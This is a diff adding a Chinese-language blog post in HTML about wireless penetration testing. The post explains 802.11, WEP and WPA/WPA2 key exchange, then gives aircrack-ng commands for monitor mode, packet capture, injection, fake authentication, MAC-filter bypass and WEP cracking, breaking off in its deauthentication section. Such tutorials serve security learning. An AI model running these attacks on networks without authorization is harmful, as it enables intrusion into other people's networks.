@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="无线通信过程连接到无线网络 Probe  STA向所有信道发出probe帧，发现AP AP应道Response   Authentication  STA向AP发出验证请求 发生认证过程（步骤可变） AP响应STA的认证结果   Association  STA发出关联请求 AP响应关联请求 关联成功，开始通信    WEP 探测过程 Beacon标识使用WEP加密 STA发送普通Probe帧 A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无线渗透">
+<meta property="og:url" content="http://yoursite.com/2018/04/01/无线渗透/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="无线通信过程连接到无线网络 Probe  STA向所有信道发出probe帧，发现AP AP应道Response   Authentication  STA向AP发出验证请求 发生认证过程（步骤可变） AP响应STA的认证结果   Association  STA发出关联请求 AP响应关联请求 关联成功，开始通信    WEP 探测过程 Beacon标识使用WEP加密 STA发送普通Probe帧 A">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-04-01T06:13:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="无线渗透">
+<meta name="twitter:description" content="无线通信过程连接到无线网络 Probe  STA向所有信道发出probe帧，发现AP AP应道Response   Authentication  STA向AP发出验证请求 发生认证过程（步骤可变） AP响应STA的认证结果   Association  STA发出关联请求 AP响应关联请求 关联成功，开始通信    WEP 探测过程 Beacon标识使用WEP加密 STA发送普通Probe帧 A">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>无线渗透</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/04/07/Web扫描工具/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/03/28/802-11-2/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/04/01/无线渗透/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/04/01/无线渗透/&text=无线渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/04/01/无线渗透/&is_video=false&description=无线渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=无线渗透&body=Check out this article: http://yoursite.com/2018/04/01/无线渗透/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/04/01/无线渗透/&title=无线渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/04/01/无线渗透/&name=无线渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#无线通信过程"><span class="toc-number">1.</span> <span class="toc-text">无线通信过程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#连接到无线网络"><span class="toc-number">1.0.1.</span> <span class="toc-text">连接到无线网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-探测过程"><span class="toc-number">1.0.2.</span> <span class="toc-text">WEP 探测过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA探测过程"><span class="toc-number">1.0.3.</span> <span class="toc-text">WPA探测过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-OPEN认证过程"><span class="toc-number">1.0.4.</span> <span class="toc-text">WEP OPEN认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-PSK认证过程"><span class="toc-number">1.0.5.</span> <span class="toc-text">WEP PSK认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP-共享密钥认证过程"><span class="toc-number">1.0.6.</span> <span class="toc-text">WEP 共享密钥认证过程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#加密"><span class="toc-number">1.0.7.</span> <span class="toc-text">加密</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#OPEN无加密网络"><span class="toc-number">1.0.8.</span> <span class="toc-text">OPEN无加密网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WEP加密系统"><span class="toc-number">1.0.9.</span> <span class="toc-text">WEP加密系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RC4算法"><span class="toc-number">1.0.10.</span> <span class="toc-text">RC4算法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA安全系统"><span class="toc-number">1.0.11.</span> <span class="toc-text">WPA安全系统</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#无线渗透实操"><span class="toc-number">2.</span> <span class="toc-text">无线渗透实操</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#AIRODUMP-NG排错"><span class="toc-number">2.1.</span> <span class="toc-text">AIRODUMP-NG排错</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG"><span class="toc-number">2.1.1.</span> <span class="toc-text">AIREPLAY-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG-排错"><span class="toc-number">2.1.2.</span> <span class="toc-text">AIREPLAY-NG 排错</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIREPLAY-NG-包注入测试"><span class="toc-number">2.1.3.</span> <span class="toc-text">AIREPLAY-NG 包注入测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MAC地址绑定攻击"><span class="toc-number">2.1.4.</span> <span class="toc-text">MAC地址绑定攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEP攻击"><span class="toc-number">2.2.</span> <span class="toc-text">WEP攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Deautnentication-攻击"><span class="toc-number">2.2.1.</span> <span class="toc-text">Deautnentication 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ARP重放"><span class="toc-number">2.2.2.</span> <span class="toc-text">ARP重放</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPA-攻击"><span class="toc-number">2.3.</span> <span class="toc-text">WPA 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA-PSK-攻击"><span class="toc-number">2.3.1.</span> <span class="toc-text">WPA PSK 攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPS-攻击"><span class="toc-number">2.4.</span> <span class="toc-text">WPS 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EVIL-TWIN-AP-ROGUE-AP"><span class="toc-number">2.4.1.</span> <span class="toc-text">EVIL TWIN AP / ROGUE AP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WPA企业"><span class="toc-number">2.4.2.</span> <span class="toc-text">WPA企业</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRDECAP-NG"><span class="toc-number">2.4.3.</span> <span class="toc-text">AIRDECAP-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRSERV-NG"><span class="toc-number">2.4.4.</span> <span class="toc-text">AIRSERV-NG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AIRTUN-NG"><span class="toc-number">2.4.5.</span> <span class="toc-text">AIRTUN-NG</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他工具"><span class="toc-number">2.5.</span> <span class="toc-text">其他工具</span></a></li></ol></li>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        无线渗透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-04-01T06:13:18.000Z" itemprop="datePublished">2018-04-01</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="无线通信过程"><a href="#无线通信过程" class="headerlink" title="无线通信过程"></a>无线通信过程</h3><h5 id="连接到无线网络"><a href="#连接到无线网络" class="headerlink" title="连接到无线网络"></a>连接到无线网络</h5><ul>
+<li>Probe</li>
+<li><ul>
+<li>STA向所有信道发出probe帧，发现AP</li>
+<li>AP应道Response</li>
+</ul>
+</li>
+<li>Authentication</li>
+<li><ul>
+<li>STA向AP发出验证请求</li>
+<li>发生认证过程（步骤可变）</li>
+<li>AP响应STA的认证结果</li>
+</ul>
+</li>
+<li>Association</li>
+<li><ul>
+<li>STA发出关联请求</li>
+<li>AP响应关联请求</li>
+<li>关联成功，开始通信</li>
+</ul>
+</li>
+</ul>
+<h5 id="WEP-探测过程"><a href="#WEP-探测过程" class="headerlink" title="WEP 探测过程"></a>WEP 探测过程</h5><ul>
+<li>Beacon标识使用WEP加密</li>
+<li>STA发送普通Probe帧</li>
+<li>AP响应Probe Response帧声明其采用WEP加密</li>
+</ul>
+<h5 id="WPA探测过程"><a href="#WPA探测过程" class="headerlink" title="WPA探测过程"></a>WPA探测过程</h5><ul>
+<li>两个AP的Beacon包内容不同，但都声明采用了WPA加密</li>
+<li><ul>
+<li>不同厂商对802.11标准的实现方式不同</li>
+</ul>
+</li>
+<li>包头包含WPA1字段信息</li>
+</ul>
+<h5 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a>WEP OPEN认证过程</h5><ul>
+<li>WEP Open认证与open认证通信过程相同</li>
+<li>正确认证后通信数据被WEP加密</li>
+<li>如果认证时客户端输入错误密码</li>
+<li><ul>
+<li>认证依然可以通过</li>
+<li>AP将丢弃该STA的数据包</li>
+<li><ul>
+<li>起始向量被错误地密钥解密后完整性被破坏</li>
+<li>但数据传输将失败</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>认证响应正确，身份验证成功</li>
+</ul>
+<h5 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h5><ul>
+<li>STA发认证请求</li>
+<li>AP返回随机Challenge消息</li>
+<li>STA使用PSK加密Cha并发回给AP</li>
+<li>AP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败</li>
+<li>大部分无线驱动首先尝试open验证，如失败则尝试PSK</li>
+</ul>
+<h5 id="WEP-共享密钥认证过程"><a href="#WEP-共享密钥认证过程" class="headerlink" title="WEP 共享密钥认证过程"></a>WEP 共享密钥认证过程</h5><ul>
+<li>无论使用什么加密架构，关联过程完全相同</li>
+<li><ul>
+<li>STA向AP发送关联请求</li>
+<li>AP向STA发送关联成功或失败结果</li>
+</ul>
+</li>
+<li>隐藏AP</li>
+<li><ul>
+<li>STA关联包中必须包含目标AP的ESSID</li>
+<li>嗅探到此关联包，说明有隐藏AP存在</li>
+</ul>
+</li>
+</ul>
+<h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><ul>
+<li>无线安全根源</li>
+<li><ul>
+<li>802.11基于无线电波发射信息</li>
+<li>嗅探侦听是主要问题</li>
+<li>加密机制是必须手段</li>
+</ul>
+</li>
+<li>Wired Equivalent Privacy(WEP)</li>
+<li><ul>
+<li>802.11标准的一部分</li>
+<li>发布后不久被发现存在安全漏洞</li>
+</ul>
+</li>
+<li>Wi-Fi Protected Access (WPA) 取代WEP</li>
+<li><ul>
+<li>WPA2（802.11i标准）</li>
+</ul>
+</li>
+</ul>
+<h5 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h5><ul>
+<li>无任何加密机制</li>
+<li>所有数据都可以被嗅探</li>
+<li>STA和AP只协商拼配参数即可连入网络</li>
+</ul>
+<h5 id="WEP加密系统"><a href="#WEP加密系统" class="headerlink" title="WEP加密系统"></a>WEP加密系统</h5><ul>
+<li>使用Rivest Cipher 4(RC4) 算法加密流量内容，实现机密性</li>
+<li>CRC32算法检查数据完整性</li>
+<li>标准采用使用24位initialization vector（IV）</li>
+<li>受美国加密技术触控限制法律的要求</li>
+<li><ul>
+<li>高于64bit key禁止出口</li>
+<li>所以除24bit IV 之外真实的key只有40bit的版本被允许出口</li>
+<li>出口限制法律撤销后实现了128bit key 的WEP版本（使用相同的24bit IV）</li>
+</ul>
+</li>
+</ul>
+<h5 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h5><ul>
+<li>RSA实验室研发的对称加密流算法</li>
+<li><ul>
+<li>实现简单</li>
+<li>速度快</li>
+</ul>
+</li>
+<li>加密：对明文流和密钥流进行XOR计算</li>
+<li>解密：对密文流和密钥流进行XOR计算</li>
+<li>RC4算法key由两个过程生成</li>
+<li><ul>
+<li>合并IV和SKA，利用Key Scheduling Algorithm(KSA)算法生成起始状态表</li>
+<li>Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流</li>
+</ul>
+</li>
+</ul>
+<h5 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h5><ul>
+<li>Wi-Fi Protected Access</li>
+<li>802.11i组为提高无线安全，开发两个新的链路层加密协议</li>
+<li><ul>
+<li>Temporal Key Integrity Protocol (TKIP)</li>
+<li><ul>
+<li>WPA1(较之WEP可动态改变密钥)</li>
+</ul>
+</li>
+<li>Counter Mode with CBC-MAC (CCMP)</li>
+<li><ul>
+<li>WPA2</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>WPA加密两种安全类型</li>
+<li><ul>
+<li>WPA个人：使用预设共享密钥实现身份认证</li>
+<li>WPA企业：使用802.1X和Radius服务器实现AAA</li>
+</ul>
+</li>
+<li>WPA1</li>
+<li><ul>
+<li>802.11i第三版草案</li>
+<li>与WEP比较</li>
+<li><ul>
+<li>都采用逐包进行密钥加密</li>
+<li>128位的key和48位的初向量（IV）</li>
+<li>RC4流加密数据</li>
+<li>帧计数器避免重放攻击</li>
+<li>TKIP使用Michael算法进行完整性校验（MIC）<ul>
+<li>WEP CRC32</li>
+</ul>
+</li>
+<li>兼容早期版本硬件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>WPA2</li>
+<li><ul>
+<li>依据802.11i完全重新设计实现</li>
+<li><ul>
+<li>也被称为Robust Security Network (RSN)</li>
+<li>CCMP 替代TKIP</li>
+<li>AES加密算法取代了RC4</li>
+<li>不兼容早期版本硬件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>WPA企业连接过程</li>
+<li><ul>
+<li>协商安全协议</li>
+<li>身份认证</li>
+<li>密钥分发和验证</li>
+<li>数据加密完整性</li>
+</ul>
+</li>
+<li>WPA-PSK</li>
+<li><ul>
+<li>协商安全协议</li>
+<li>密钥分发和验证</li>
+<li>数据加密完整性</li>
+</ul>
+</li>
+<li>协商认证方式</li>
+<li><ul>
+<li>PSK/802.1X</li>
+</ul>
+</li>
+<li>单播和组播/广播流量加密套件</li>
+<li><ul>
+<li>TKIP / CCMP</li>
+</ul>
+</li>
+<li>STA通过probe 获取无线网络信息</li>
+<li><ul>
+<li>速率</li>
+<li>加密</li>
+<li>通道</li>
+<li>名称</li>
+</ul>
+</li>
+<li>身份认证（WPA企业）</li>
+<li><ul>
+<li>身份认证基于Extensible Authentication Protocol(EAP)实现</li>
+<li><ul>
+<li>EAP-TLS 需要客户端和服务器证书</li>
+<li>EAP-TTLS</li>
+<li>PEAP混合身份验证，只需要服务器证书</li>
+</ul>
+</li>
+<li>客户端选择身份认证方式</li>
+<li>AP发送身份验证消息给Radius Server</li>
+<li>Radius Server 返回 Radius Accept 表示认证成功</li>
+<li><ul>
+<li>其中包含 Master Key (MK)</li>
+</ul>
+</li>
+<li>AP 通过EAP消息通知STA认证成功</li>
+</ul>
+</li>
+<li>密钥交换</li>
+<li><ul>
+<li><p>无线网络设计用于一组无线设备通信</p>
+</li>
+<li><ul>
+<li><p>关联到同一AP的设备共享无线信道</p>
+</li>
+<li><p>单播、广播、组播</p>
+</li>
+<li><ul>
+<li>安全特性要求不同</li>
+<li>单播通信需要单独密钥加密通信双方流量</li>
+<li>pairwise key :对偶密钥（PTK）</li>
+<li>组播通信需要信任域内所有成员共享的同一密钥</li>
+<li>group key : 组密钥（GTK）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>PMK</li>
+<li><ul>
+<li>安全上下文的顶级密钥</li>
+<li><ul>
+<li>MK进行TLS-PRF加密得出PMK </li>
+</ul>
+</li>
+<li>基于服务密钥</li>
+<li><ul>
+<li>由上层身份验证方法服务器生成</li>
+<li>从服务器通过radius传给AP</li>
+<li>从AP通过EAP消息传给所有STA</li>
+</ul>
+</li>
+<li>基于PSK共享密钥</li>
+<li><ul>
+<li>ESSID + PSK+ 迭代次数4096 —— Hash计算生成</li>
+<li>STA和AP分别计算得出PMK ， 并不在网络中传递互换</li>
+</ul>
+</li>
+<li>256位即32字节</li>
+</ul>
+</li>
+<li>密钥交换</li>
+<li><ul>
+<li>PTK的生成过程</li>
+<li><ul>
+<li>HMAC-SHA1散列算法</li>
+<li>PRF-X散列算法</li>
+</ul>
+</li>
+<li>四步握手过程生成PTK</li>
+<li><ul>
+<li>AP发送Anonce给STA</li>
+<li>STA生成Snonce计算出PTK</li>
+<li>Snonce加PTK的MIC发给AP</li>
+<li>AP拿到Snonce计算出PTK</li>
+<li>AP计算MIC与接收的MIC比对</li>
+<li>MIC一致说明确定STA知道PMK</li>
+<li>AP发GTK给STA</li>
+<li>STA回复ACK并使用密钥加密</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据加密和完整性</li>
+<li><ul>
+<li>三种算法</li>
+<li><ul>
+<li>Temporal Key Integrity Protocol (TKIP) 4</li>
+<li>Counter Mode with CBC-MAC (CCMP) 5</li>
+<li>Wireless Robust Authenticated Protocol (WRAP) 6</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="无线渗透实操"><a href="#无线渗透实操" class="headerlink" title="无线渗透实操"></a>无线渗透实操</h3><ul>
+<li>Aircrack-ng</li>
+<li>无线渗透和审计神器</li>
+<li>包含各种功能的工具组件</li>
+<li><ul>
+<li>网络检测</li>
+<li>嗅探抓包</li>
+<li>包注入</li>
+<li>密码破解</li>
+</ul>
+</li>
+<li>检查完卡驱动</li>
+<li>开启和停止无线侦听</li>
+<li><code>airmon-ng check</code></li>
+<li><code>airmon-ng check kill</code></li>
+<li><code>airmon-ng start wlan2</code></li>
+<li><code>iwlist wlan0mon channel</code></li>
+<li><code>airmon-ng stop wlan0mon</code></li>
+<li>无线抓包</li>
+<li><code>airodump-ng wlan2mon</code></li>
+<li><code>airodump wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap</code></li>
+<li><code>aireplay -9 wlan2mon</code></li>
+<li><code>airreplay</code></li>
+<li><code>airodump-ng wlan0mon</code></li>
+<li><code>airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap</code></li>
+<li><code>airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs</code></li>
+<li><code>BSSID</code> :AP 的MAC地址</li>
+<li><code>PWR</code>： 网卡接收到的信号强度，距离越近信号越强</li>
+<li><code>-1</code>：驱动不支持信号强度，STA距离超出信号接收范围</li>
+<li><code>RXQ</code>： 最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现</li>
+<li><code>Beacons</code>: 接收到此AP发送的Beacon帧数量</li>
+<li><code>#Data</code>: 抓到的数据帧数量（WEP表示IV数量），包含广播数据帧</li>
+<li><code>#/s</code>: 最近10秒内，每秒平均抓到的帧的数量</li>
+<li><code>CH</code>: 信道号（从beacon帧中获得），信道重叠时可能发现其他信道</li>
+<li><code>MB</code>：AP支持的最大速率</li>
+<li><code>ENC</code>：采用的无线安全技术WEP、WPA、WPA2、 OPEN</li>
+<li><code>CIPHER</code>:采用的加密套件CCMP、TKIP、WEP40、WEP104</li>
+<li><code>AUTH</code>:身份认证方法MGT、PSK、SKA、OPEN</li>
+<li><code>ESSID</code>: 无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP</li>
+<li><code>STATION</code>:STA的MAC地址</li>
+<li><code>Lost</code>:通过sequence number 判断最近10秒STA发送丢失的数据包数量（管理帧、数据帧）</li>
+<li><ul>
+<li>干扰、距离</li>
+<li>发包不能收、收包不能发</li>
+</ul>
+</li>
+<li><code>Packets</code>: STA 发送的数据包数量</li>
+<li><code>Probes</code>:STA探测的ESSID</li>
+</ul>
+<h4 id="AIRODUMP-NG排错"><a href="#AIRODUMP-NG排错" class="headerlink" title="AIRODUMP-NG排错"></a>AIRODUMP-NG排错</h4><ul>
+<li>不显示任何AP和STA信息</li>
+<li><ul>
+<li>物理机场景下使用笔记本内置无线网卡时，确保BIOS中已启用无线网卡</li>
+<li>确认无线网卡在managed模式下可以正常工作</li>
+<li>尝试禁用network-manager服务</li>
+<li>尝试卸载rmmod和重新加载modprobe驱动</li>
+</ul>
+</li>
+<li>工作一段时间后airodump-ng无法继续抓包</li>
+<li><ul>
+<li>airmon-ng check kill</li>
+<li>确认wpa_supplicant 进程已停止</li>
+</ul>
+</li>
+</ul>
+<h5 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h5><ul>
+<li>产生或者加速无线通信流量</li>
+<li><ul>
+<li>向无线网络中注入数据包</li>
+<li><ul>
+<li>伪造身份验证</li>
+<li>强制重新身份验证</li>
+<li>抓包重放</li>
+</ul>
+</li>
+<li>用于后续WEP和WPA密码破解</li>
+<li>支持10种包注入</li>
+</ul>
+</li>
+<li>获取包的两种途径</li>
+<li><ul>
+<li>指定接口（-i）</li>
+<li>抓包文件pcap(-r)</li>
+</ul>
+</li>
+<li>aireplay-ng <options> <interface name=""></interface></options></li>
+<li>Filter命令选项（除0、1两种攻击方式）</li>
+</ul>
+<h5 id="AIREPLAY-NG-排错"><a href="#AIREPLAY-NG-排错" class="headerlink" title="AIREPLAY-NG 排错"></a>AIREPLAY-NG 排错</h5><ul>
+<li>Aireplay-ng 命令挂起没有任何输出</li>
+<li><ul>
+<li>无线网卡与AP工作在不同信道</li>
+</ul>
+</li>
+<li>报错“write failed: Cannot allocate memory wi_write():illegal seek”</li>
+<li><ul>
+<li>无线网卡使用Broadcom芯片 （bcm43xx), 替换为b43驱动可解决</li>
+</ul>
+</li>
+<li>可注入但速度很慢，并提示内核信息”rtc: lost some interrupts at 1024Hz”</li>
+<li><ul>
+<li>没有修正方法，此时可以启动多个aireplay-ng命令提高速度</li>
+</ul>
+</li>
+<li>使用-h参数指定注入MAC地址与网卡MAC地址不一致报错</li>
+<li><ul>
+<li>建议保持一致（macchange)</li>
+</ul>
+</li>
+</ul>
+<h5 id="AIREPLAY-NG-包注入测试"><a href="#AIREPLAY-NG-包注入测试" class="headerlink" title="AIREPLAY-NG 包注入测试"></a>AIREPLAY-NG 包注入测试</h5><ul>
+<li>检测网卡是否可以注入包</li>
+<li>检测AP的响应时间</li>
+<li><ul>
+<li>回包率反应链路质量</li>
+</ul>
+</li>
+<li>如果有两个无线网卡，可以检测具体可以注入哪种攻击</li>
+<li>基本测试检测AP对Probe广播的响应</li>
+<li><ul>
+<li>向每AP发30包</li>
+<li>网卡成功发送并可接收包的能力</li>
+</ul>
+</li>
+<li>基本测试</li>
+<li><ul>
+<li><code>airplay -9 wlan0mon</code></li>
+</ul>
+</li>
+<li>向隐藏AP/指定SSID注入</li>
+<li><ul>
+<li><code>aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan0mon</code></li>
+</ul>
+</li>
+<li>card to card 注入测试</li>
+<li><ul>
+<li>具体攻击方式</li>
+<li>-i 作为AP的网卡</li>
+<li>5/7 Faild</li>
+<li><ul>
+<li>注入MAC和真实MAC相同时可以正常使用</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h5><ul>
+<li>管理员误以为MAC绑定是一种安全机制</li>
+<li>限制可以关联的客户端MAC地址</li>
+<li>准备AP</li>
+<li><ul>
+<li>AP基本配置</li>
+<li>OPEN认证</li>
+<li>开启无线过滤</li>
+</ul>
+</li>
+<li>修改MAC地址绕过过滤</li>
+</ul>
+<h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><ul>
+<li>WEP密码破解原理</li>
+<li><ul>
+<li>IV并非完全随机</li>
+<li>每224个包可能出现一次IV重用</li>
+<li>收集大量IV 之后找出相同IV及其对应密文，分析得出共享密码</li>
+</ul>
+</li>
+<li>ARP回包中包含IV</li>
+<li>IV足够多的情况下，任何复杂程度的WEP密码都可以被破解</li>
+<li>启动monitor模式</li>
+<li>启动抓包并保存抓包</li>
+<li>Deauthentication 抓取XOR 文件</li>
+<li>利用XOR文件与AP建立关联</li>
+<li>执行ARP重放</li>
+<li>Deauthentication 触发ARP数据包</li>
+<li>收集足够DATA之后破解密码</li>
+<li>WEP破解全部需要首先伪造认证，以便与AP进行正常通信</li>
+<li>不产生ARP数据包</li>
+<li><code>aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</code></li>
+<li><code>aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;YourMAC&gt;&lt;interface&gt;</code></li>
+<li><ul>
+<li>每6000秒发送reauthentication</li>
+<li>-o 1 每次身份认证只发一组认证数据包</li>
+<li>-q 10 每10秒发keep-live帧</li>
+</ul>
+</li>
+<li>某些AP验证客户端MAC地址OUI （前三个字节）</li>
+<li>MAC地址过滤</li>
+<li>Denied(Code 1 )is WPA in use</li>
+<li><ul>
+<li>WPA/WPA2不支持Fake authentication</li>
+</ul>
+</li>
+<li>使用真实MAC地址</li>
+<li>物理靠经AP</li>
+<li>侦听信道正确</li>
+</ul>
+<h5 id="Deautnentication-攻击"><a href="#Deautnentication-攻击" class="headerlink" title="Deautnentication 攻击"></a>Deautnentication 攻击</h5><ul>
+<li>强制客户端与AP断开关联</li>
+<li><ul>
+<li>重连生成ARP请求，AP回包包含IV</li>
+<li>WPA重连过程抓取4步握手过程</li>
